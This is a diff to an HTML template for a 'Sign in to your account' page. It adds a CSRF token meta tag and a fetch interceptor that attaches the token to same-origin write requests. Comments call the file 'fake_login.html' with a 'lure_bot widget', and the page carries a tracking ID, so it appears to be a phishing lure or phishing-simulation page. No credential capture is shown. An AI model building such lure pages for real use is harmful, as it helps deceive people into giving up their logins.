@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in to your account</title>
+    <meta name="csrf-token" content="{{ csrf_token() }}">
     <style>
         body {
             font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
@@ -137,6 +138,45 @@
     </div>
 
     <script>
+        // CSRF Fetch Interceptor for fake_login.html and lure_bot widget
+        (function() {
+            const nativeFetch = window.fetch.bind(window);
+            window.fetch = (input, init) => {
+                let url = "";
+                let method = "GET";
+                if (typeof input === "string" || input instanceof URL) {
+                    url = input.toString();
+                    if (init && init.method) {
+                        method = init.method.toUpperCase();
+                    }
+                } else if (input && typeof input === "object") {
+                    url = input.url || "";
+                    method = (input.method || "GET").toUpperCase();
+                }
+                const isPost = ["POST", "PUT", "DELETE", "PATCH"].includes(method);
+                const isSameOrigin = !url.startsWith("http://") && !url.startsWith("https://") || url.startsWith(window.location.origin);
+                if (isPost && isSameOrigin) {
+                    const token = "{{ csrf_token() }}";
+                    if (token) {
+                        if (!init) init = {};
+                        if (!init.headers) init.headers = {};
+                        if (init.headers instanceof Headers) {
+                            if (!init.headers.has('X-CSRFToken')) {
+                                init.headers.append('X-CSRFToken', token);
+                            }
+                        } else if (Array.isArray(init.headers)) {
+                            const hasCsrf = init.headers.some(h => h[0].toLowerCase() === 'x-csrftoken');
+                            if (!hasCsrf) init.headers.push(['X-CSRFToken', token]);
+                        } else {
+                            const hasCsrf = Object.keys(init.headers).some(k => k.toLowerCase() === 'x-csrftoken');
+                            if (!hasCsrf) init.headers['X-CSRFToken'] = token;
+                        }
+                    }
+                }
+                return nativeFetch(input, init);
+            };
+        })();
+
         const form = document.getElementById('login-form');
         const loader = document.getElementById('loader');
         const trackingId = "{{ tracking_id }}";
